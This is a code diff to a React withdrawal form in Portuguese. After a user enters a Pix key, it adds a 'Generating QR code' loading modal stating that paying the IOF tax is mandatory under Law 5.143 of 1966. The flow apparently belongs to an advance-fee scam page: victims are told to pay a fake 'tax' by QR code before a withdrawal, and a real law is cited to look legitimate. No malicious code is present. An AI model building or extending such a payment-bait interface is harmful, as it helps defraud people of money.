@@ -2,6 +2,10 @@ import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Menu } from "lucide-react";
 import { Switch } from "@/components/ui/switch";
+import {
+  Dialog,
+  DialogContent,
+} from "@/components/ui/dialog";
 
 const WithdrawForm = () => {
   const navigate = useNavigate();
@@ -10,6 +14,7 @@ const WithdrawForm = () => {
   const [chavePix, setChavePix] = useState("");
   const [aceitaTermos, setAceitaTermos] = useState(false);
   const [errors, setErrors] = useState<{[key: string]: boolean}>({});
+  const [showLoadingModal, setShowLoadingModal] = useState(false);
 
   const handleSubmit = () => {
     const newErrors: {[key: string]: boolean} = {};
@@ -22,8 +27,7 @@ const WithdrawForm = () => {
     setErrors(newErrors);
 
     if (Object.keys(newErrors).length === 0) {
-      // Form is valid - could navigate to next step
-      console.log("Formulário válido");
+      setShowLoadingModal(true);
     }
   };
 
@@ -115,6 +119,36 @@ const WithdrawForm = () => {
             Próximo
           </button>
         </div>
+
+        {/* Loading Modal */}
+        <Dialog open={showLoadingModal} onOpenChange={setShowLoadingModal}>
+          <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6">
+            <h2 className="text-foreground text-2xl font-serif font-bold text-center">
+              Gerando Qrcode
+            </h2>
+            
+            {/* Yellow Spinner */}
+            <div className="relative w-32 h-32">
+              <svg className="w-full h-full animate-spin" viewBox="0 0 100 100">
+                <circle
+                  cx="50"
+                  cy="50"
+                  r="40"
+                  stroke="hsl(var(--primary))"
+                  strokeWidth="8"
+                  fill="none"
+                  strokeLinecap="round"
+                  strokeDasharray="200"
+                  strokeDashoffset="60"
+                />
+              </svg>
+            </div>
+
+            <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
+              O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
+            </p>
+          </DialogContent>
+        </Dialog>
       </main>
     </div>
   );
